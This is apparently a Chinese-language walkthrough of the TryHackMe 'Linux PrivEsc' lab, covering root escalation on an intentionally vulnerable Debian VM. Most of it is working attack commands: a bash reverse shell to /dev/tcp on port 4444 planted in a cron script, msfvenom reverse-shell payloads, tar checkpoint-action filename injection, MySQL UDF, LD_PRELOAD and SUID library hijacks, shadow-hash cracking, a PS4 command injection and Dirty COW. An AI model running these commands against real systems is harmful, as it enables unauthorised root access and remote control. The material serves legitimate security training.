---
sidebar_position: 3
---

# Linux PrivEsc - Linux 特权提升

> [TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)
>
> Updated in 2023-12-20
>
> 在一个特意配置错误的 Debian 虚拟机上练习你的 Linux 特权提升技能，有多种方式可以获 \ n\n 取 root 权限！SSH 可用。凭证：user:password321
>
> Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321

## 部署易受攻击的 Debian 虚拟机

这个房间旨在引导你了解各种 Linux 特权提升技术。为此，你首先需要部署一个有意设定的易受攻击的 Debian 虚拟机。这个虚拟机最初是由 Sagi Shahar 创建的，作为他本地特权提升研讨会的一部分，但已经由 Tib3rius 在 Udemy 的《Linux 特权提升——针对 OSCP 及更多！》课程中进行了更新。在那里可以找到对本房间中使用的各种技术的详细解释，以及有关在 Linux 中找到特权提升的演示和提示。

:::info Answer the questions below

运行 `id` 命令。 结果是什么？

```plaintext
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

:::

## 服务漏洞利用

MySQL 服务正在以 root 身份运行，并且服务的 "root" 用户未设置密码。我们可以利用一种常见的漏洞利用方式，利用用户定义函数（UDF）通过 MySQL 服务以 root 身份运行系统命令。

切换到 `/home/user/tools/mysql-udf` 目录：

```shell
cd /home/user/tools/mysql-udf
```

使用以下命令编译 `raptor_udf2.c` 漏洞利用代码：

```shell
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

以 root 用户身份使用空白密码连接到 MySQL 服务：

```shell
mysql -u root
```

在 MySQL shell 中执行以下命令，创建一个名为 `do_system` 的用户定义函数（UDF），使用我们编译的漏洞利用代码：

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

使用该函数将 `/bin/bash` 复制到 `/tmp/rootbash` ，并设置 SUID 权限：

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

退出 MySQL shell（输入 `exit` 或 `\q` 然后按 Enter），然后运行 `/tmp/rootbash` 可执行文件，并使用 -p 参数获取一个具有 root 权限的 shell：

```shell
/tmp/rootbash -p
```

记得在继续之前删除 `/tmp/rootbash` 可执行文件并退出 root shell，因为你将在后面的步骤中再次创建这个文件！

```shell
rm /tmp/rootbash
exit
```

## 弱文件权限 - 可读取 /etc/shadow

`/etc/shadow` 文件包含用户密码哈希值，通常只有 root 用户可读。

请注意，虚拟机上的 `/etc/shadow` 文件可以被所有用户读取：

```shell
ls -l /etc/shadow
```

查看 /etc/shadow 文件的内容：

```shell
cat /etc/shadow
```

文件中的每一行代表一个用户。用户的密码哈希（如果存在）可以在每行的第一个冒号（:）和第二个冒号（:）之间找到。

将 root 用户的哈希保存到名为 `hash.txt` 的文件中，并使用 `John the Ripper` 进行破解。根据你使用的 Kali 版本，你可能需要先解压 `/usr/share/wordlists/rockyou.txt.gz` 文件，并使用 sudo 运行该命令：

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

使用破解后的密码切换到 `root` 用户：

```shell
su root
```

记得在继续之前退出 root shell！

:::info Answer the questions below

根用户的密码哈希是什么？

```plaintext
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

用于生成根用户密码哈希的哈希算法是什么？

<details>

<summary> 具体操作步骤 </summary>

```shell
$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2023-12-20 14:01) 4.347g/s 6678p/s 6678c/s 6678C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

</details>

```plaintext
sha512crypt
```

根用户的密码是什么？

```plaintext
password123
```

:::

## 弱文件权限 - 可写入 /etc/shadow

`/etc/shadow` 文件包含用户密码哈希值，通常只有 root 用户可读。

请注意，虚拟机上的 `/etc/shadow` 文件可以被所有用户写入：

```shell
ls -l /etc/shadow
```

使用你选择的密码生成一个新的密码哈希：

```shell
mkpasswd -m sha-512 newpasswordhere
```

编辑 `/etc/shadow` 文件，将原始 root 用户的密码哈希替换为你刚生成的新哈希。

使用新密码切换到 root 用户：

```shell
su root
```

记得在继续之前退出 root shell！

## 弱文件权限 - 可写入 /etc/passwd

`/etc/passwd` 文件包含用户账户的信息。它可以被所有用户读取，但通常只有 root 用户可写。在历史上，`/etc/passwd` 文件包含用户密码哈希值，一些 Linux 版本仍然允许在那里存储密码哈希。

请注意，虚拟机上的 `/etc/passwd` 文件可以被所有用户写入：

```shell
ls -l /etc/passwd
```

使用你选择的密码生成一个新的密码哈希：

```shell
openssl passwd newpasswordhere
```

编辑 `/etc/passwd` 文件，在 root 用户的行中第一个冒号（:）和第二个冒号（:）之间（替换 "x"），放置生成的密码哈希。

或者，复制 root 用户的行并将其追加到文件底部，将第一个 `root` 更改为 `newroot` ，并在第一个冒号（替换 "x"）之间放置生成的密码哈希。

现在使用新密码切换到 newroot 用户：

使用新密码切换到 root 用户：

```shell
su root
```

记得在继续之前退出 root shell！

```shell
su root
```

:::info Answer the questions below

以 newroot 用户身份运行 "id" 命令。结果是什么？

<details>

<summary> 具体操作步骤 </summary>

首先，先生成一份密码哈希

```shell
user@debian:~$ openssl passwd newpasswordhere
Warning: truncating password to 8 characters
biLFGpooiO5HQ
```

生成以下数据插入到 `/etc/passwd`

```plaintext
newroot:biLFGpooiO5HQ:0:0:root:/root:/bin/bash
```

</details>

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```

:::

## Sudo - Shell 逃逸序列

列出 sudo 允许你的用户运行的程序。

```shell
sudo -l
```

访问 [GTFOBins - https://gtfobins.github.io](https://gtfobins.github.io) ，搜索一些程序名称。如果程序在列表中显示有 "sudo" 作为一个功能，通常可以使用它来通过逃逸序列提升权限。

从列表中选择一个程序，并尝试按照 GTFOBins 上的说明获得 root shell。

作为额外挑战，尝试使用列表中的所有程序获得 root shell！

记得在继续之前退出 root shell！

:::info Answer the questions below

`user` 被允许通过 sudo 运行多少个程序？

<details>

<summary> 具体操作步骤 </summary>

```shell
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

</details>

```shell
11
```

列表中有一个程序在 GTFOBins 上没有 shell 逃逸序列，是哪一个？

```plaintext
apache2
```

:::

## Sudo - 环境变量

sudo 可以配置以继承用户环境中的某些环境变量。

检查哪些环境变量被继承（寻找 env_keep 选项）：

```shell
sudo -l
```

`LD_PRELOAD` 和 `LD_LIBRARY_PATH` 都是从用户的环境中继承的。`LD_PRELOAD` 在运行程序时在其他所有共享对象之前加载一个共享对象。`LD_LIBRARY_PATH` 提供了共享库首先搜索的目录列表。

使用位于 `/home/user/tools/sudo/preload.c` 的代码创建一个共享对象：

```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

运行你可以通过 sudo 运行的程序之一（在运行 sudo -l 时列出的程序），同时将 `LD_PRELOAD` 环境变量设置为新共享对象的完整路径：

```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

一个 root shell 应该被生成。在继续之前退出这个 shell。根据你选择的程序，你可能需要退出这个程序的 shell。

运行 `ldd` 命令来查看 apache2 程序文件使用了哪些共享库：

```shell
ldd /usr/sbin/apache2
```

使用位于 `/home/user/tools/sudo/library_path.c` 的代码创建一个与列表中某个库（比如 `libcrypt.so.1` ）同名的共享对象：

```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

使用 `sudo` 运行 `apache2` ，同时将 `LD_LIBRARY_PATH` 环境变量设置为 `/tmp`（这是我们输出编译后的共享对象的地方）：

```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

一个 root shell 应该被生成。退出这个 shell。尝试将 `/tmp/libcrypt.so.1` 重命名为 `apache2` 使用的另一个库的名称，然后再次使用 `sudo` 运行 `apache2` 。它能够工作吗？如果不能，请尝试找出原因，以及如何更改 `library_path.c` 代码使其能够工作。

记得在继续之前退出 root shell！

## 定时任务 - 文件权限

Cron 任务是用户可以安排在特定时间或间隔运行的程序或脚本。Cron 表文件（crontabs）存储了 cron 任务的配置。系统范围的 crontab 位于 `/etc/crontab` 。

查看系统范围的 crontab 内容：

```shell
cat /etc/crontab
```

应该有两个 cron 任务被安排在每分钟运行一次。一个运行 `overwrite.sh` ，另一个运行 `/usr/local/bin/compress.sh` 。

定位 `overwrite.sh` 文件的完整路径：

```shell
locate overwrite.sh
```

请注意，该文件是可被所有用户写入的。

```shell
ls -l /usr/local/bin/overwrite.sh
```

将 `overwrite.sh` 文件的内容替换为以下内容，将其中的 IP 地址更改为您 Kali 系统的 IP 地址后：

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

在您的 Kali 系统上的端口 4444 上设置一个 netcat 监听器，并等待 cron 任务运行（不应超过一分钟）。一个 root shell 应该会连接回您的 netcat 监听器。如果没有连接回来，请重新检查文件的权限，看是否有什么遗漏？

```shell
nc -nvlp 4444
```

请记得在继续之前退出 root shell 并移除反向 shell 代码！

## 定时任务 - PATH 环境变量

查看系统范围的 crontab 内容：

```shell
cat /etc/crontab
```

请注意，PATH 变量以 `/home/user` 开头，这是我们用户的主目录。

在您的主目录下创建一个名为 `overwrite.sh` 的文件，并添加以下内容：

```shell
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

确保该文件是可执行的：

```shell
chmod +x /home/user/overwrite.sh
```

等待 cron 任务运行（不应超过一分钟）。使用 -p 参数运行 `/tmp/rootbash` 命令，以获取以 root 权限运行的 shell。

```shell
/tmp/rootbash -p
```

记得在继续之前移除修改过的代码，删除 `/tmp/rootbash` 可执行文件，并退出提升权限的 shell，因为您稍后会再次创建这个文件！

```shell
rm /tmp/rootbash
exit
```

:::info Answer the questions below

`/etc/crontab` 文件中的 PATH 变量的值是什么？

<details>

<summary> 具体操作步骤 </summary>

```shell
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.daily)
47 6    * * 7   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.weekly)
52 6    1 * *   root    test -x /usr/sbin/anacron || (cd / && run-parts --report /etc/cron.monthly)
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

</details>

```plaintext
/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

:::

## 定时任务 - 通配符

查看其他计划任务脚本的内容:

```shell
cat /usr/local/bin/compress.sh
```

请注意，tar 命令在您的主目录中使用了通配符 (*)。

查看 GTFOBins 页面上关于 [tar](https://gtfobins.github.io/gtfobins/tar/) 的信息。请注意，tar 具有命令行选项，可以作为检查点功能的一部分运行其他命令。

在您的 Kali 系统上使用 `msfvenom` 生成一个反向 shell ELF 二进制文件。根据需要更新 `LHOST IP` 地址：

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

将 `shell.elf` 文件传输到 Debian 虚拟机上的 `/home/user/` 目录（您可以使用 scp 或者在 Kali 系统上托管文件并使用 wget）。确保文件具有可执行权限：

```shell
chmod +x /home/user/shell.elf
```

在 `/home/user` 目录下创建这两个文件

```shell
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

当 cron 作业中的 tar 命令运行时，通配符（*）将会扩展以包括这些文件。由于它们的文件名是有效的 tar 命令行选项，tar 会将它们识别为选项而不是文件名。

在您的 Kali 系统上的端口 4444 上设置一个 netcat 监听器，并等待 cron 作业运行（不应该超过一分钟）。一个 root shell 应该会连接回您的 netcat 监听器。

```shell
nc -nvlp 4444
```

记得退出 root shell 并删除您创建的所有文件，以防止 cron 作业再次执行：

```shell
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

## SUID / SGID 可执行文件 - 已知漏洞

找到 Debian 虚拟机上所有的 SUID/SGID 可执行文件：

```shell
find / -type f -a \(-perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

请注意，结果中出现了 `/usr/sbin/exim-4.84-3` 。尝试找到针对这个版本 exim 的已知漏洞。`Exploit-DB` 、`Google` 和 `GitHub` 都是搜索的好去处！

应该可以找到一个与这个 exim 版本完全匹配的本地特权升级漏洞利用。在 Debian 虚拟机上的 `/home/user/tools/suid/exim/cve-2016-1531.sh` 路径下可以找到一份副本。

运行这个漏洞利用脚本以获得一个 root shell：

```shell
/home/user/tools/suid/exim/cve-2016-1531.sh
```

在继续之前记得退出 root shell！

## SUID / SGID 可执行文件 - 共享对象注入

`/usr/local/bin/suid-so` 的 SUID 可执行文件容易受到共享对象注入攻击。

首先，执行该文件，并注意目前它在退出前显示一个进度条：

```shell
/usr/local/bin/suid-so
```

运行 `strace` 命令来跟踪该文件，并在输出中搜索 `open/access` 调用和 `no such file` 错误：

```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

注意到可执行文件试图加载位于我们家目录下的 `/home/user/.config/libcalc.so` 共享对象，但未找到。

为 `libcalc.so` 文件创建 `.config` 目录：

```shell
mkdir /home/user/.config
```

示例共享对象代码位于 `/home/user/tools/suid/libcalc.c` 。它简单地生成一个 `Bash shell` 。将代码编译成一个共享对象，放置到 `suid-so` 可执行文件寻找的位置：

```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

再次执行 `suid-so` 可执行文件，注意这次不再显示进度条，而是得到了一个 root shell。

```shell
/usr/local/bin/suid-so
```

在继续之前记得退出 root shell！

## SUID / SGID 可执行文件 - 环境变量

可执行文件 `/usr/local/bin/suid-env` 存在漏洞，因为它继承了用户的 `PATH` 环境变量，并尝试执行程序而未指定绝对路径。

首先，执行该文件并注意到它似乎尝试启动 `apache2` web 服务器：

```shell
/usr/local/bin/suid-env
```

对该文件运行 `strings` 命令以查找可打印字符的字符串：

```shell
strings /usr/local/bin/suid-env
```

一行代码 (`service apache2 start`) 暗示着正在调用 `service` 可执行文件来启动 web 服务器，然而并未使用可执行文件的完整路径 ( `/usr/sbin/service` )。

将位于 `/home/user/tools/suid/service.c` 的代码编译成一个名为 `service` 的可执行文件。该代码简单地生成一个 Bash shell：

```shell
gcc -o service /home/user/tools/suid/service.c
```

在 `PATH` 变量中添加当前目录（或新的 `service` 可执行文件所在的目录），然后运行 `suid-env` 可执行文件以获取 root shell：

```shell
PATH=.:$PATH /usr/local/bin/suid-env
```

记得在继续之前退出 root shell！

## SUID / SGID 可执行文件 - 滥用 Shell 功能（#1）

`/usr/local/bin/suid-env2` 可执行文件与 `/usr/local/bin/suid-env` 完全相同，唯一不同之处在于它使用了 service 可执行文件的绝对路径 (`/usr/sbin/service`) 来启动 apache2 web 服务器。

请使用 strings 命令验证一下：

```shell
strings /usr/local/bin/suid-env2
```

在 Bash 版本低于 `4.2-048` 的情况下，可以定义名称类似文件路径的 shell 函数，然后导出这些函数，使其在使用时替代该文件路径下的任何实际可执行文件。

验证一下 Debian 虚拟机上安装的 Bash 版本是否低于 `4.2-048` ：

```shell
/bin/bash --version
```

创建一个名为 `/usr/sbin/service` 的 Bash 函数，该函数执行一个新的 Bash shell（使用 `-p` 以保留权限），然后导出该函数：

```shell
function /usr/sbin/service {/bin/bash -p;}
export -f /usr/sbin/service
```

运行 `suid-env2` 可执行文件以获取 root shell：

```shell
/usr/local/bin/suid-env2
```

记得在继续之前退出 root shell！

## SUID / SGID 可执行文件 - 滥用 Shell 功能（#2）

:::note

这种方法在 `Bash 4.4` 及更高版本上无法生效。

:::

在调试模式下，Bash 使用环境变量 `PS4` 来显示用于调试语句的额外提示。

以启用 Bash 调试并将 `PS4` 变量设置为一个嵌入式命令的方式运行 `/usr/local/bin/suid-env2` 可执行文件，该命令将创建 `/bin/bash` 的 SUID 版本：

```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

运行 `/tmp/rootbash` 可执行文件并附加 `-p` 选项以获取以 root 权限运行的 shell：

```shell
/tmp/rootbash -p
```

记得在继续之前移除 `/tmp/rootbash` 可执行文件并退出提权后的 shell，因为稍后你将在房间中再次创建这个文件！

```shell
rm /tmp/rootbash
exit
```

## 密码与密钥 - 历史文件

如果用户不小心在命令行中输入密码而不是在密码提示符中输入，密码可能会被记录在历史文件中。

查看用户主目录中所有隐藏历史文件的内容：

```shell
cat ~/.*history | less
```

请注意，用户曾尝试连接到 MySQL 服务器，使用了 "root" 用户名和通过命令行提交的密码。请注意，-p 选项和密码之间没有空格！

使用密码切换到 root 用户：

```shell
su root
```

在继续之前，请记得退出 root shell！

:::info Answer the questions below

用户执行的完整 mysql 命令是什么？

```plaintext
mysql -h somehost.local -uroot -ppassword123
```

:::

## 密码与密钥 - 配置文件

配置文件通常以明文或其他可逆转格式包含密码信息。

列出用户主目录的内容：

```shell
ls /home/user
```

请注意存在一个名为 `myvpn.ovpn` 的配置文件。查看文件内容：

```shell
cat /home/user/myvpn.ovpn
```

该文件应该包含一个指向另一个位置的引用，其中可以找到 root 用户的凭据。使用这些凭据切换到 root 用户：

```shell
su root
```

在继续之前，请记得退出 root shell！

:::info Answer the questions below

在哪个文件中找到 root 用户的凭据？

```plaintext
/etc/openvpn/auth.txt
```

:::

## 密码与密钥 - SSH 密钥

有时用户会备份重要文件，但未能使用正确的权限保护它们。

在系统根目录中查找隐藏文件和目录：

```shell
ls -la /
```

请注意，似乎存在一个名为 `.ssh` 的隐藏目录。查看目录内容：

```shell
ls -l /.ssh
```

请注意，有一个名为 `root_key` 的全局可读文件。进一步检查这个文件应该显示它是一个私人 SSH 密钥。文件名暗示它是用于 root 用户的。

将密钥复制到您的 Kali 系统（最简单的方法是查看 `root_key` 文件的内容，然后复制 / 粘贴密钥），并赋予正确的权限，否则您的 SSH 客户端将拒绝使用它。

```shell
chmod 600 root_key
```

使用这个密钥登录到 Debian 虚拟机的 root 账户（请注意，由于系统的年代较久远，使用 SSH 时可能需要一些额外的设置）。

```shell
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.243.70
```

在继续之前，请记得退出 root shell！

## NFS

通过 NFS 创建的文件会继承远程用户的 ID。如果用户是 root，并且启用了 root 压缩（root squashing），那么 ID 将被设置为 “nobody” 用户。

检查 Debian 虚拟机上的 NFS 共享配置：

```shell
cat /etc/exports
```

请注意，`/tmp` 共享已禁用了 root 压缩。

在您的 Kali 系统上，如果您还没有以 root 用户身份运行，请切换到 root 用户：

```shell
sudo su
```

使用 Kali 的 root 用户，在您的 Kali 系统上创建一个挂载点，并挂载 `/tmp` 共享（根据需要更新 IP）：

```shell
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

继续使用 Kali 的 root 用户，使用 `msfvenom` 生成一个 payload，并将其保存到挂载的共享目录中（这个 payload 只是调用 `/bin/bash` ）：

```shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

仍然使用 Kali 的 root 用户，将文件设为可执行并设置 SUID 权限：

```shell
chmod +xs /tmp/nfs/shell.elf
```

回到 Debian 虚拟机，在低权限用户账户下执行该文件以获取 root shell：

```shell
/tmp/shell.elf
```

在继续之前，请记得退出 root shell！

:::info Answer the questions below

禁用 root 压缩的选项的名称是什么？

```shell
no_root_squash
```

:::

## 内核漏洞利用

内核漏洞利用可能导致系统处于不稳定状态，因此只有在最后一种情况下才应该运行它们。

运行 `Linux Exploit Suggester 2` 工具，识别当前系统可能存在的内核漏洞利用：

```shell
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

这个知名的 Linux 内核漏洞利用称为 `Dirty COW` 。`Dirty COW` 的漏洞代码可以在 `/home/user/tools/kernel-exploits/dirtycow/c0w.c` 找到。它会用一个产生 shell 的文件替换 SUID 文件 `/usr/bin/passwd`（ `/usr/bin/passwd` 的备份存放在 /tmp/bak）。

编译这段代码并运行它（请注意，这可能需要几分钟才能完成）：

```shell
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

漏洞利用完成后，运行 `/usr/bin/passwd` 来获取一个 root shell：

```shell
/usr/bin/passwd
```

在继续之前，请记得恢复原始的 `/usr/bin/passwd` 文件并退出 root shell！

```shell
mv /tmp/bak /usr/bin/passwd
exit
```

## 特权升级脚本

在 Linux 上编写了几个工具，可以帮助发现潜在的权限提升漏洞。其中三个工具已经包含在 Debian 虚拟机的以下目录中：`/home/user/tools/privesc-scripts`
